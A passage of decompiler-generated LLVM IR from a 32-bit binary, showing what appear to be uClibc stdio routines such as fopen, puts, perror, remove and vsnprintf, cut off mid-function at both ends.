  %v0_805b54e = load i32, i32* @esi, align 4
  %v0_805b54f = load i32, i32* @ebx, align 4
  %v4_805b553 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805b553, i32* @esi, align 4
  %v1_805b557 = add i32 %v4_805b553, 52
  %v2_805b557 = inttoptr i32 %v1_805b557 to i32*
  %v3_805b557 = load i32, i32* %v2_805b557, align 4
  store i32 %v3_805b557, i32* @ebp, align 4
  %v1_805b55a = icmp eq i32 %v3_805b557, 0
  %v1_805b55c = icmp eq i1 %v1_805b55a, false
  br i1 %v1_805b55c, label %dec_label_pc_805b57d, label %dec_label_pc_805b55e

dec_label_pc_805b55e:                             ; preds = %entry
  %v1_805b55e = add i32 %v4_805b553, 56
  store i32 %v1_805b55e, i32* @ebx, align 4
  %v4_805b56d = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134586897, i32 %v1_805b55e)
  %v0_805b572 = load i32, i32* @ebx, align 4
  %v1_805b575 = call i32 @pthread_mutex_lock(i32 %v0_805b572)
  %v0_805b57f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b57d

dec_label_pc_805b57d:                             ; preds = %entry, %dec_label_pc_805b55e
  %v0_805b587 = phi i32 [ %v4_805b553, %entry ], [ %v0_805b57f.pre, %dec_label_pc_805b55e ]
  store i32 0, i32* @edi, align 4
  %v1_805b57f = inttoptr i32 %v0_805b587 to i8*
  %v2_805b57f = load i8, i8* %v1_805b57f, align 1
  %v3_805b57f = and i8 %v2_805b57f, 64
  %v4_805b57f = icmp eq i8 %v3_805b57f, 0
  br i1 %v4_805b57f, label %dec_label_pc_805b57d.dec_label_pc_805b592_crit_edge, label %dec_label_pc_805b584

dec_label_pc_805b57d.dec_label_pc_805b592_crit_edge: ; preds = %dec_label_pc_805b57d
  br label %dec_label_pc_805b592

dec_label_pc_805b584:                             ; preds = %dec_label_pc_805b57d
  %v1_805b588 = inttoptr i32 %v0_805b587 to i16*
  %v2_805b588 = call i32 @fflush_unlocked(i16* %v1_805b588)
  store i32 %v2_805b588, i32* @edi, align 4
  %v0_805b595.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b592

dec_label_pc_805b592:                             ; preds = %dec_label_pc_805b57d.dec_label_pc_805b592_crit_edge, %dec_label_pc_805b584
  %v0_805b595 = phi i32 [ %v0_805b587, %dec_label_pc_805b57d.dec_label_pc_805b592_crit_edge ], [ %v0_805b595.pre, %dec_label_pc_805b584 ]
  %v1_805b595 = add i32 %v0_805b595, 4
  %v2_805b595 = inttoptr i32 %v1_805b595 to i32*
  %v3_805b595 = load i32, i32* %v2_805b595, align 4
  %v1_805b598 = call i32 @__libc_close(i32 %v3_805b595)
  %v0_805b5a0 = load i32, i32* @esi, align 4
  %v1_805b5a0 = add i32 %v0_805b5a0, 4
  %v2_805b5a0 = inttoptr i32 %v1_805b5a0 to i32*
  store i32 -1, i32* %v2_805b5a0, align 4
  %v2_805b5b1 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805b5b1, i32* @ebx, align 4
  %v2_805b5b6 = icmp slt i32 %v1_805b598, 0
  %v1_805b5bd = load i32, i32* @edi, align 4
  %v3_805b5bd = select i1 %v2_805b5b6, i32 -1, i32 %v1_805b5bd
  store i32 %v3_805b5bd, i32* @edi, align 4
  %v4_805b5c0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134586897, i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
  %v1_805b5cc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
  %v0_805b5d1 = load i32, i32* @global_var_807b688.681, align 8
  %v1_805b5d6 = add i32 %v0_805b5d1, 1
  store i32 %v1_805b5d6, i32* @global_var_807b688.681, align 8
  %v3_805b5e1 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805b5e6 = load i32, i32* @esi, align 4
  %v1_805b5e6 = inttoptr i32 %v0_805b5e6 to i32*
  %v2_805b5e6 = load i32, i32* %v1_805b5e6, align 4
  %v1_805b5eb = and i32 %v2_805b5e6, 24576
  %v1_805b5f0 = or i32 %v1_805b5eb, 48
  %v1_805b5f5 = trunc i32 %v1_805b5f0 to i16
  %v3_805b5f5 = inttoptr i32 %v0_805b5e6 to i16*
  store i16 %v1_805b5f5, i16* %v3_805b5f5, align 2
  br i1 %v1_805b55c, label %dec_label_pc_805b60b, label %dec_label_pc_805b5fa

dec_label_pc_805b5fa:                             ; preds = %dec_label_pc_805b592
  %v3_805b603 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805b60b

dec_label_pc_805b60b:                             ; preds = %dec_label_pc_805b592, %dec_label_pc_805b5fa
  %v0_805b60b = load i32, i32* @esi, align 4
  %v1_805b60b = add i32 %v0_805b60b, 1
  %v2_805b60b = inttoptr i32 %v1_805b60b to i8*
  %v3_805b60b = load i8, i8* %v2_805b60b, align 1
  %v4_805b60b = and i8 %v3_805b60b, 64
  %v5_805b60b = icmp eq i8 %v4_805b60b, 0
  br i1 %v5_805b60b, label %dec_label_pc_805b61f, label %dec_label_pc_805b611

dec_label_pc_805b611:                             ; preds = %dec_label_pc_805b60b
  %v1_805b614 = add i32 %v0_805b60b, 8
  %v2_805b614 = inttoptr i32 %v1_805b614 to i32*
  %v3_805b614 = load i32, i32* %v2_805b614, align 4
  %v1_805b617 = call i32 @free(i32 %v3_805b614)
  br label %dec_label_pc_805b61f

dec_label_pc_805b61f:                             ; preds = %dec_label_pc_805b60b, %dec_label_pc_805b611
  %v4_805b62b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134586897, i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
  %v1_805b637 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
  %v0_805b63d = load i32, i32* @global_var_807b68c.682, align 4
  %v1_805b63d = add i32 %v0_805b63d, 1
  store i32 %v1_805b63d, i32* @global_var_807b68c.682, align 4
  %v3_805b647 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805b64c = call i32 @_stdio_openlist_dec_use()
  %v0_805b654 = load i32, i32* @edi, align 4
  store i32 %v0_805b54f, i32* @ebx, align 4
  store i32 %v0_805b54e, i32* @esi, align 4
  store i32 %v0_805b54d, i32* @edi, align 4
  store i32 %v0_805b54c, i32* @ebp, align 4
  ret i32 %v0_805b654

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_805b61f, { 1, 0 }
  uselistorder label %dec_label_pc_805b60b, { 1, 0 }
  uselistorder label %dec_label_pc_805b592, { 1, 0 }
  uselistorder label %dec_label_pc_805b57d, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805b66b = inttoptr i32 %arg2 to i8*
  %v5_805b66b = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_805b66b, i32 0, i32 -1)
  ret i32 %v5_805b66b
}

define i32 @perror(i8* %arg1) local_unnamed_addr {
entry:
  %v1_805b67b = icmp eq i8* %arg1, null
  br i1 %v1_805b67b, label %dec_label_pc_805b689, label %dec_label_pc_805b67f

dec_label_pc_805b67f:                             ; preds = %entry
  %v4_805b677 = ptrtoint i8* %arg1 to i32
  %v2_805b67f = load i8, i8* %arg1, align 1
  %v3_805b67f = icmp eq i8 %v2_805b67f, 0
  %v1_805b687 = icmp eq i1 %v3_805b67f, false
  br i1 %v1_805b687, label %dec_label_pc_805b690, label %dec_label_pc_805b689

dec_label_pc_805b689:                             ; preds = %dec_label_pc_805b67f, %entry
  br label %dec_label_pc_805b690

dec_label_pc_805b690:                             ; preds = %dec_label_pc_805b67f, %dec_label_pc_805b689
  %v0_805b691 = phi i32 [ ptrtoint (i32* @global_var_806f699.684 to i32), %dec_label_pc_805b689 ], [ %v4_805b677, %dec_label_pc_805b67f ]
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_806f699.684 to i32), %dec_label_pc_805b689 ], [ ptrtoint ([3 x i8]* @global_var_806f697.683 to i32), %dec_label_pc_805b67f ]
  store i32 %storemerge, i32* @edx, align 4
  %v0_805b6972 = load i32, i32* bitcast (i8** @global_var_8074d70 to i32*), align 4
  %v5_805b69d = call i32 @fprintf(i32 %v0_805b6972, i32 ptrtoint ([8 x i8]* @global_var_806d9e0.685 to i32), i32 %v0_805b691)
  ret i32 %v5_805b69d

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_806f699.684 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_805b690, { 1, 0 }
}

define i32 @puts(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805b6a8 = load i32, i32* @edi, align 4
  %v0_805b6a9 = load i32, i32* @esi, align 4
  %v0_805b6aa = load i32, i32* @ebx, align 4
  %v0_805b6ae = load i8*, i8** @global_var_8074d6c, align 4
  %v1_805b6ae = ptrtoint i8* %v0_805b6ae to i32
  store i32 %v1_805b6ae, i32* @esi, align 4
  %v1_805b6b4 = add i32 %v1_805b6ae, 52
  %v2_805b6b4 = inttoptr i32 %v1_805b6b4 to i32*
  %v3_805b6b4 = load i32, i32* %v2_805b6b4, align 4
  store i32 %v3_805b6b4, i32* @edi, align 4
  %v1_805b6b7 = icmp eq i32 %v3_805b6b4, 0
  %v1_805b6b9 = icmp eq i1 %v1_805b6b7, false
  br i1 %v1_805b6b9, label %entry.dec_label_pc_805b6da_crit_edge, label %dec_label_pc_805b6bb

entry.dec_label_pc_805b6da_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805b6da

dec_label_pc_805b6bb:                             ; preds = %entry
  %v1_805b6bb = add i32 %v1_805b6ae, 56
  store i32 %v1_805b6bb, i32* @ebx, align 4
  %v5_805b6ca = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134586897, i32 %v1_805b6bb)
  %v0_805b6cf = load i32, i32* @ebx, align 4
  %v1_805b6d2 = call i32 @pthread_mutex_lock(i32 %v0_805b6cf)
  %v0_805b6dc.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b6da

dec_label_pc_805b6da:                             ; preds = %entry.dec_label_pc_805b6da_crit_edge, %dec_label_pc_805b6bb
  %v0_805b6dc = phi i32 [ %v1_805b6ae, %entry.dec_label_pc_805b6da_crit_edge ], [ %v0_805b6dc.pre, %dec_label_pc_805b6bb ]
  %v0_805b6da = load i32, i32* @ecx, align 4
  %v5_805b6e1 = inttoptr i32 %arg1 to i8*
  %v6_805b6e1 = call i32 @__GI_fputs_unlocked(i8* %v5_805b6e1, i32 %v0_805b6dc, i32 %v0_805b6da, i32 %v0_805b6da)
  %v10_805b6e9 = icmp eq i32 %v6_805b6e1, -1
  store i32 %v6_805b6e1, i32* @ebx, align 4
  br i1 %v10_805b6e9, label %dec_label_pc_805b706, label %dec_label_pc_805b6f0

dec_label_pc_805b6f0:                             ; preds = %dec_label_pc_805b6da
  %v0_805b6f2 = load i32, i32* @esi, align 4
  %v4_805b6f5 = call i32 @putc_unlocked(i8 10, i32 %v0_805b6f2)
  %v8_805b6fd = icmp eq i32 %v4_805b6f5, -1
  %v1_805b6fe = icmp eq i1 %v8_805b6fd, false
  br i1 %v1_805b6fe, label %dec_label_pc_805b705, label %dec_label_pc_805b700

dec_label_pc_805b700:                             ; preds = %dec_label_pc_805b6f0
  store i32 -1, i32* @ebx, align 4
  br label %dec_label_pc_805b706

dec_label_pc_805b705:                             ; preds = %dec_label_pc_805b6f0
  %v0_805b705 = load i32, i32* @ebx, align 4
  %v1_805b705 = add i32 %v0_805b705, 1
  store i32 %v1_805b705, i32* @ebx, align 4
  br label %dec_label_pc_805b706

dec_label_pc_805b706:                             ; preds = %dec_label_pc_805b6da, %dec_label_pc_805b700, %dec_label_pc_805b705
  %v0_805b71e7 = phi i32 [ %v6_805b6e1, %dec_label_pc_805b6da ], [ -1, %dec_label_pc_805b700 ], [ %v1_805b705, %dec_label_pc_805b705 ]
  br i1 %v1_805b6b9, label %dec_label_pc_805b71b, label %dec_label_pc_805b70a

dec_label_pc_805b70a:                             ; preds = %dec_label_pc_805b706
  %v4_805b713 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805b71e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805b71b

dec_label_pc_805b71b:                             ; preds = %dec_label_pc_805b706, %dec_label_pc_805b70a
  %v0_805b71e = phi i32 [ %v0_805b71e7, %dec_label_pc_805b706 ], [ %v0_805b71e.pre, %dec_label_pc_805b70a ]
  store i32 %v0_805b6aa, i32* @ebx, align 4
  store i32 %v0_805b6a9, i32* @esi, align 4
  store i32 %v0_805b6a8, i32* @edi, align 4
  ret i32 %v0_805b71e

; uselistorder directives
  uselistorder i32 %v6_805b6e1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805b71b, { 1, 0 }
  uselistorder label %dec_label_pc_805b706, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805b6da, { 1, 0 }
}

define i32 @remove(i32 %arg1) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805b724 = load i32, i32* @edi, align 4
  %v0_805b725 = load i32, i32* @esi, align 4
  %v0_805b726 = load i32, i32* @ebx, align 4
  store i32 %v0_805b726, i32* %stack_var_-12, align 4
  %v1_805b727 = call i32 @__errno_location(i32 %v0_805b726)
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_805b733 = inttoptr i32 %v1_805b727 to i32*
  %v2_805b733 = load i32, i32* %v1_805b733, align 4
  store i32 %v2_805b733, i32* @edi, align 4
  store i32 %v1_805b727, i32* @ebx, align 4
  %v1_805b738 = call i32 @rmdir(i32 %arg1)
  %v2_805b740 = icmp slt i32 %v1_805b738, 0
  %v1_805b742 = icmp eq i1 %v2_805b740, false
  br i1 %v1_805b742, label %dec_label_pc_805b757, label %dec_label_pc_805b744

dec_label_pc_805b744:                             ; preds = %entry
  %v0_805b744 = load i32, i32* @ebx, align 4
  %v1_805b744 = inttoptr i32 %v0_805b744 to i32*
  %v2_805b744 = load i32, i32* %v1_805b744, align 4
  %v11_805b744 = icmp eq i32 %v2_805b744, 20
  %v1_805b747 = icmp eq i1 %v11_805b744, false
  br i1 %v1_805b747, label %dec_label_pc_805b757, label %dec_label_pc_805b749

dec_label_pc_805b749:                             ; preds = %dec_label_pc_805b744
  %v0_805b749 = load i32, i32* @edi, align 4
  store i32 %v0_805b749, i32* %v1_805b744, align 4
  %v0_805b74b = load i32, i32* %esi.global-to-local, align 4
  %v2_805b74f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b74f, i32* @ebx, align 4
  store i32 %v0_805b725, i32* %esi.global-to-local, align 4
  store i32 %v0_805b724, i32* @edi, align 4
  %v1_805b752 = call i32 @unlink(i32 %v0_805b74b)
  br label %dec_label_pc_805b757

dec_label_pc_805b757:                             ; preds = %dec_label_pc_805b744, %entry, %dec_label_pc_805b749
  %v0_805b75a = phi i32 [ %v1_805b738, %dec_label_pc_805b744 ], [ %v1_805b738, %entry ], [ %v1_805b752, %dec_label_pc_805b749 ]
  %v2_805b757 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b757, i32* @ebx, align 4
  store i32 %v0_805b725, i32* @esi, align 4
  store i32 %v0_805b724, i32* @edi, align 4
  ret i32 %v0_805b75a

; uselistorder directives
  uselistorder i32 %v1_805b727, { 1, 0 }
  uselistorder i32 %v0_805b725, { 1, 0 }
  uselistorder i32 %v0_805b724, { 1, 0 }
  uselistorder label %dec_label_pc_805b757, { 2, 0, 1 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805b78d = inttoptr i32 %arg1 to i8*
  %v5_805b78d = call i32 @__GI_vsnprintf(i8* %v4_805b78d, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_805b78d
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805b79b = ptrtoint i32* %stack_var_12 to i32
  %v0_805b7a3 = load i32, i32* @edx, align 4
  %v4_805b7ad = inttoptr i32 %arg1 to i16*
  %v5_805b7ad = call i32 @__GI_vfprintf(i16* %v4_805b7ad, i32 %arg2, i32 %v2_805b79b, i32 %v0_805b7a3)
  ret i32 %v5_805b7ad
}

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %v2_805b7bb = ptrtoint i32* %stack_var_16 to i32
  %v4_805b7d0 = inttoptr i32 %arg1 to i8*
  %v5_805b7d0 = call i32 @__GI_vsnprintf(i8* %v4_805b7d0, i32 %arg2, i32 %arg3, i32 %v2_805b7bb)
  ret i32 %v5_805b7d0
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805b890 = load i32, i32* @ebp, align 4
  %v0_805b891 = load i32, i32* @edi, align 4
  %v0_805b892 = load i32, i32* @esi, align 4
  %v0_805b893 = load i32, i32* @ebx, align 4
  store i32 %v0_805b893, i32* %stack_var_-16, align 4
  %v4_805b897 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805b897, i32* @esi, align 4
  %v2_805b89b = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_805b8a6 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_805b8a6, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_805b8c0 = sub i32 -1, %v4_805b897
  %v1_805b8d3 = call i32 @__stdio_init_mutex(i32 %v2_805b89b)
  %v1_805b8e3 = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_805b8c0, %v1_805b8e3
  %v5_805b8e5 = select i1 %tmp, i32 %v1_805b8c0, i32 %v1_805b8e3
  store i32 %v5_805b8e5, i32* @ebx, align 4
  %v0_805b8e8 = load i32, i32* @esi, align 4
  %v3_805b912 = inttoptr i32 %arg3 to i8*
  %v4_805b912 = call i32 @_vfprintf_internal(i32 %v2_805b8a6, i8* %v3_805b912, i32 %arg4)
  %v1_805b91a = icmp eq i32 %v5_805b8e5, 0
  store i32 %v4_805b912, i32* %edx.global-to-local, align 4
  br i1 %v1_805b91a, label %dec_label_pc_805b936, label %dec_label_pc_805b92f

dec_label_pc_805b92f:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_805b8e8 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_805b939.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805b936

dec_label_pc_805b936:                             ; preds = %entry, %dec_label_pc_805b92f
  %v0_805b939 = phi i32 [ %v4_805b912, %entry ], [ %v0_805b939.pre, %dec_label_pc_805b92f ]
  %v2_805b93b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805b93b, i32* @ebx, align 4
  store i32 %v0_805b892, i32* @esi, align 4
  store i32 %v0_805b891, i32* @edi, align 4
  store i32 %v0_805b890, i32* @ebp, align 4
  ret i32 %v0_805b939

; uselistorder directives
  uselistorder i32 %v1_805b8e3, { 1, 0 }
  uselistorder i32 %v1_805b8c0, { 1, 0 }
  uselistorder label %dec_label_pc_805b936, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805bbf8 = load i32, i32* @ebp, align 4
  %v0_805bbf9 = load i32, i32* @edi, align 4
  %v0_805bbfa = load i32, i32* @esi, align 4
  %v0_805bbfb = load i32, i32* @ebx, align 4
  store i32 %v0_805bbfb, i32* %stack_var_-16, align 4
  %v4_805bbff = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_805bc0f = load i8, i8* %arg2, align 1
  %v3_805bc0f = zext i8 %v2_805bc0f to i32
  %v4_805bc0f = load i32, i32* @eax, align 4
  %v5_805bc0f = and i32 %v4_805bc0f, -256
  %v6_805bc0f = or i32 %v5_805bc0f, %v3_805bc0f
  store i32 %v6_805bc0f, i32* %eax.global-to-local, align 4
  %v10_805bc11 = icmp eq i8 %v2_805bc0f, 114
  br i1 %v10_805bc11, label %dec_label_pc_805bc53, label %dec_label_pc_805bc15

dec_label_pc_805bc15:                             ; preds = %entry
  %v10_805bc15 = icmp eq i8 %v2_805bc0f, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_805bc15, label %dec_label_pc_805bc55, label %dec_label_pc_805bc1e

dec_label_pc_805bc1e:                             ; preds = %dec_label_pc_805bc15
  %v10_805bc1e = icmp eq i8 %v2_805bc0f, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_805bc1e, label %dec_label_pc_805bc55, label %dec_label_pc_805bc26

dec_label_pc_805bc26:                             ; preds = %dec_label_pc_805bcce, %dec_label_pc_805bca8, %dec_label_pc_805bc1e
  %v0_805bc26 = load i32, i32* %stack_var_-16, align 4
  %v1_805bc26 = call i32 @__errno_location(i32 %v0_805bc26)
  store i32 %v1_805bc26, i32* %eax.global-to-local, align 4
  %v0_805bc2b = load i32, i32* @ebp, align 4
  %v1_805bc2b = icmp eq i32 %v0_805bc2b, 0
  %v1_805bc2d = inttoptr i32 %v1_805bc26 to i32*
  store i32 22, i32* %v1_805bc2d, align 4
  br i1 %v1_805bc2b, label %dec_label_pc_805be2f, label %dec_label_pc_805bc39

dec_label_pc_805bc39:                             ; preds = %dec_label_pc_805bcf1, %dec_label_pc_805bc26
  %v0_805bc39 = load i32, i32* @ebp, align 4
  %v1_805bc39 = add i32 %v0_805bc39, 1
  %v2_805bc39 = inttoptr i32 %v1_805bc39 to i8*
  %v3_805bc39 = load i8, i8* %v2_805bc39, align 1
  %v4_805bc39 = and i8 %v3_805bc39, 32
  %v5_805bc39 = icmp eq i8 %v4_805bc39, 0
  br i1 %v5_805bc39, label %dec_label_pc_805be2f, label %dec_label_pc_805bc43

dec_label_pc_805bc43:                             ; preds = %dec_label_pc_805bc39
  store i32 %v0_805bc39, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805bc49 = call i32 @free(i32 %v0_805bc39)
  br label %dec_label_pc_805be2a

dec_label_pc_805bc53:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805bc55

dec_label_pc_805bc55:                             ; preds = %dec_label_pc_805bc1e, %dec_label_pc_805bc15, %dec_label_pc_805bc53
  %v0_805bc66 = phi i32 [ 1089, %dec_label_pc_805bc1e ], [ 577, %dec_label_pc_805bc15 ], [ 0, %dec_label_pc_805bc53 ]
  %v1_805bc55 = add i32 %v4_805bbff, 1
  %v2_805bc55 = inttoptr i32 %v1_805bc55 to i8*
  %v3_805bc55 = load i8, i8* %v2_805bc55, align 1
  %v12_805bc55 = icmp eq i8 %v3_805bc55, 98
  %v1_805bc55.v4_805bbff = select i1 %v12_805bc55, i32 %v1_805bc55, i32 %v4_805bbff
  store i32 %v1_805bc55.v4_805bbff, i32* %eax.global-to-local, align 4
  %v1_805bc60 = add i32 %v1_805bc55.v4_805bbff, 1
  %v2_805bc60 = inttoptr i32 %v1_805bc60 to i8*
  %v3_805bc60 = load i8, i8* %v2_805bc60, align 1
  %v12_805bc60 = icmp eq i8 %v3_805bc60, 43
  %v1_805bc64 = icmp eq i1 %v12_805bc60, false
  br i1 %v1_805bc64, label %dec_label_pc_805bc6e, label %dec_label_pc_805bc66

dec_label_pc_805bc66:                             ; preds = %dec_label_pc_805bc55
  %v1_805bc68 = or i32 %v0_805bc66, 1
  store i32 %v1_805bc68, i32* %eax.global-to-local, align 4
  %v1_805bc6b = add nuw nsw i32 %v1_805bc68, 1
  store i32 %v1_805bc6b, i32* @ebx, align 4
  br label %dec_label_pc_805bc6e

dec_label_pc_805bc6e:                             ; preds = %dec_label_pc_805bc55, %dec_label_pc_805bc66
  %v0_805bcf17 = phi i32 [ %v0_805bc66, %dec_label_pc_805bc55 ], [ %v1_805bc6b, %dec_label_pc_805bc66 ]
  %v1_805bc6e = icmp eq i32 %arg3, 0
  %v1_805bc70 = icmp eq i1 %v1_805bc6e, false
  br i1 %v1_805bc70, label %dec_label_pc_805bca4, label %dec_label_pc_805bc72

dec_label_pc_805bc72:                             ; preds = %dec_label_pc_805bc6e
  store i32 80, i32* %stack_var_-76, align 4
  %v1_805bc77 = call i32 @malloc(i32 80)
  store i32 %v1_805bc77, i32* %eax.global-to-local, align 4
  %v2_805bc7f = icmp eq i32 %v1_805bc77, 0
  store i32 %v1_805bc77, i32* @ebp, align 4
  br i1 %v2_805bc7f, label %dec_label_pc_805be31, label %dec_label_pc_805bc89

dec_label_pc_805bc89:                             ; preds = %dec_label_pc_805bc72
  %v2_805bc77 = inttoptr i32 %v1_805bc77 to i16*
  store i16 8192, i16* %v2_805bc77, align 2
  %v2_805bc91 = add i32 %v1_805bc77, 8
  %v3_805bc91 = inttoptr i32 %v2_805bc91 to i32*
  store i32 0, i32* %v3_805bc91, align 4
  %v2_805bc98 = add i32 %v1_805bc77, 56
  store i32 %v2_805bc98, i32* %eax.global-to-local, align 4
  store i32 %v2_805bc98, i32* %stack_var_-76, align 4
  %v1_805bc9c = call i32 @__stdio_init_mutex(i32 %v2_805bc98)
  store i32 %v1_805bc9c, i32* %eax.global-to-local, align 4
  %v0_805bcf1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805bca4

dec_label_pc_805bca4:                             ; preds = %dec_label_pc_805bc6e, %dec_label_pc_805bc89
  %v2_805bcf7 = phi i32 [ %v0_805bcf17, %dec_label_pc_805bc6e ], [ %v0_805bcf1.pre, %dec_label_pc_805bc89 ]
  %v2_805bca4 = icmp slt i32 %arg4, 0
  br i1 %v2_805bca4, label %dec_label_pc_805bcf1, label %dec_label_pc_805bca8

dec_label_pc_805bca8:                             ; preds = %dec_label_pc_805bca4
  %v1_805bcaa = and i32 %v2_805bcf7, 32771
  %v1_805bcb0 = add nuw nsw i32 %v1_805bcaa, 1
  %v0_805bcb1 = load i32, i32* @esi, align 4
  %v1_805bcb1 = add i32 %v0_805bcb1, 1
  %v2_805bcb4 = and i32 %v1_805bcb1, %v1_805bcb0
  store i32 %v2_805bcb4, i32* %eax.global-to-local, align 4
  %v12_805bcb6 = icmp eq i32 %v2_805bcb4, %v1_805bcb0
  %v1_805bcb8 = load i32, i32* @ebp, align 4
  %v2_805bcb8 = add i32 %v1_805bcb8, 4
  %v3_805bcb8 = inttoptr i32 %v2_805bcb8 to i32*
  store i32 %arg4, i32* %v3_805bcb8, align 4
  %v1_805bcbb = icmp eq i1 %v12_805bcb6, false
  br i1 %v1_805bcbb, label %dec_label_pc_805bc26, label %dec_label_pc_805bcc1

dec_label_pc_805bcc1:                             ; preds = %dec_label_pc_805bca8
  %v0_805bcc1 = load i32, i32* @esi, align 4
  %v1_805bcc3 = and i32 %v0_805bcc1, 1024
  %v1_805bcc5 = xor i32 %v1_805bcc3, 1024
  store i32 %v1_805bcc5, i32* %eax.global-to-local, align 4
  %v1_805bcca = load i32, i32* @ebx, align 4
  %v2_805bcca = and i32 %v1_805bcca, %v1_805bcc5
  %v3_805bcca = icmp eq i32 %v2_805bcca, 0
  br i1 %v3_805bcca, label %dec_label_pc_805bcc1.dec_label_pc_805bce7_crit_edge, label %dec_label_pc_805bcce

dec_label_pc_805bcc1.dec_label_pc_805bce7_crit_edge: ; preds = %dec_label_pc_805bcc1
  br label %dec_label_pc_805bce7

dec_label_pc_805bcce:                             ; preds = %dec_label_pc_805bcc1
  store i32 4, i32* %stack_var_-72, align 4
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_805bcd7 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_805bcd7, i32* %eax.global-to-local, align 4
  %v1_805bcdf = icmp eq i32 %v3_805bcd7, 0
  %v1_805bce1 = icmp eq i1 %v1_805bcdf, false
  br i1 %v1_805bce1, label %dec_label_pc_805bc26, label %dec_label_pc_805bcce.dec_label_pc_805bce7_crit_edge

dec_label_pc_805bcce.dec_label_pc_805bce7_crit_edge: ; preds = %dec_label_pc_805bcce
  %v0_805bce7.pre = load i32, i32* @esi, align 4
  %v0_805bced.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805bce7

dec_label_pc_805bce7:                             ; preds = %dec_label_pc_805bcc1.dec_label_pc_805bce7_crit_edge, %dec_label_pc_805bcce.dec_label_pc_805bce7_crit_edge
  %v0_805bced = phi i32 [ %v1_805bcca, %dec_label_pc_805bcc1.dec_label_pc_805bce7_crit_edge ], [ %v0_805bced.pre, %dec_label_pc_805bcce.dec_label_pc_805bce7_crit_edge ]
  %v0_805bce7 = phi i32 [ %v0_805bcc1, %dec_label_pc_805bcc1.dec_label_pc_805bce7_crit_edge ], [ %v0_805bce7.pre, %dec_label_pc_805bcce.dec_label_pc_805bce7_crit_edge ]
